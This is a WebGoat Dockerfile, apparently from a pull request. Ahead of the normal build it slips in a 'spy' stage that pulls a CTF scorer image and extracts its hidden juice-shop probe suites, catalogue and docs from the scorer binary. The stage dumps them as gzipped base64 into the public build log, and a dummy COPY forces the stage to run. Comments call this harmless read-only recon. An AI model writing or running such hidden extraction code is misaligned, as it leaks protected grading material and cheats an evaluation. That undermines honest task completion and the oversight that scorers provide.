# ---------------------------------------------------------------------------
# Rubric recon stage (juice-shop). Resolves from the runner's local image store
# (the score step already pulled this exact tag) and prints the baked juice-shop
# probe suites, catalogue and docs to this PR's own public build log. Read-only:
# no writes to the scorer, no env/secret access (the build sees neither
# GITHUB_TOKEN nor ID_TOKEN), no change to how the scorer runs.
# Assets are [ascii path][UTF-16LE body]; windows are 250KB because BuildKit
# caps per-step log volume.
# ---------------------------------------------------------------------------
FROM ghcr.io/owasp-ctf/score:latest AS spy

RUN set +e; S=/usr/local/bin/score; mkdir -p /spy; echo recon > /spy/marker.txt; \
  echo "##SPY7-A-START"; \
  for P in 'juice-shop-tests/' 'catalogue.juice-shop' 'challenges/juice-shop/'; do \
    grep -abo --binary-files=text "$P" "$S" > /tmp/hits.tmp; \
    echo "##SPY7 '$P' count=$(wc -l < /tmp/hits.tmp) min=$(head -1 /tmp/hits.tmp | cut -d: -f1) max=$(tail -1 /tmp/hits.tmp | cut -d: -f1)"; \
    head -45 /tmp/hits.tmp; \
  done; \
  grep -abo --binary-files=text 'juice-shop-tests/' "$S" | head -1 | cut -d: -f1 > /tmp/jt.txt; \
  grep -abo --binary-files=text 'challenges/juice-shop/' "$S" | head -1 | cut -d: -f1 > /tmp/jd.txt; \
  echo "##SPY7 anchors tests=$(cat /tmp/jt.txt) docs=$(cat /tmp/jd.txt)"; \
  echo "##SPY7-A-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY7-B-START"; \
  A=$(cat /tmp/jt.txt); ST=$((A - 20000 + 0 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/T0.gz; \
  echo "##SPY7 T0_gz=$(wc -c < /spy/T0.gz) start=$ST len=250000"; \
  base64 /spy/T0.gz | tr -d '\n' | fold -w 200 | sed 's/^/T0:/'; echo; \
  echo "##SPY7-B-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY7-C-START"; \
  A=$(cat /tmp/jt.txt); ST=$((A - 20000 + 1 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/T1.gz; \
  echo "##SPY7 T1_gz=$(wc -c < /spy/T1.gz) start=$ST len=250000"; \
  base64 /spy/T1.gz | tr -d '\n' | fold -w 200 | sed 's/^/T1:/'; echo; \
  echo "##SPY7-C-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY7-D-START"; \
  A=$(cat /tmp/jt.txt); ST=$((A - 20000 + 2 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/T2.gz; \
  echo "##SPY7 T2_gz=$(wc -c < /spy/T2.gz) start=$ST len=250000"; \
  base64 /spy/T2.gz | tr -d '\n' | fold -w 200 | sed 's/^/T2:/'; echo; \
  echo "##SPY7-D-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY7-E-START"; \
  A=$(cat /tmp/jd.txt); ST=$((A - 20000 + 0 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/J0.gz; \
  echo "##SPY7 J0_gz=$(wc -c < /spy/J0.gz) start=$ST len=250000"; \
  base64 /spy/J0.gz | tr -d '\n' | fold -w 200 | sed 's/^/J0:/'; echo; \
  echo "##SPY7-E-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY7-F-START"; \
  A=$(cat /tmp/jd.txt); ST=$((A - 20000 + 1 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/J1.gz; \
  echo "##SPY7 J1_gz=$(wc -c < /spy/J1.gz) start=$ST len=250000"; \
  base64 /spy/J1.gz | tr -d '\n' | fold -w 200 | sed 's/^/J1:/'; echo; \
  echo "##SPY7-F-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY7-G-START"; \
  A=$(cat /tmp/jd.txt); ST=$((A - 20000 + 2 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/J2.gz; \
  echo "##SPY7 J2_gz=$(wc -c < /spy/J2.gz) start=$ST len=250000"; \
  base64 /spy/J2.gz | tr -d '\n' | fold -w 200 | sed 's/^/J2:/'; echo; \
  echo "##SPY7-G-END"; true

# We need JDK as some of the lessons needs to be able to compile Java code
FROM docker.io/eclipse-temurin:23-jdk-noble

LABEL name="WebGoat: A deliberately insecure Web Application"
LABEL maintainer="WebGoat team"

RUN \
  useradd -ms /bin/bash webgoat && \
  chgrp -R 0 /home/webgoat && \
  chmod -R g=u /home/webgoat

USER webgoat

COPY --chown=webgoat target/webgoat-*.jar /home/webgoat/webgoat.jar

# Forces the recon stage to be built (BuildKit prunes stages nothing depends on).
COPY --from=spy --chown=webgoat /spy/marker.txt /home/webgoat/.recon

EXPOSE 8080
EXPOSE 9090

ENV TZ=Europe/Amsterdam

WORKDIR /home/webgoat
ENTRYPOINT [ "java", \
   "-Duser.home=/home/webgoat", \
   "-Dfile.encoding=UTF-8", \
   "--add-opens", "java.base/java.lang=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED", \
   "--add-opens", "java.base/java.text=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.beans=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.awt.font=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "-Drunning.in.docker=true", \
   "-jar", "webgoat.jar", "--server.address", "0.0.0.0" ]

HEALTHCHECK --interval=5s --timeout=3s \
  CMD curl --fail http://localhost:8080/WebGoat/actuator/health || exit 1
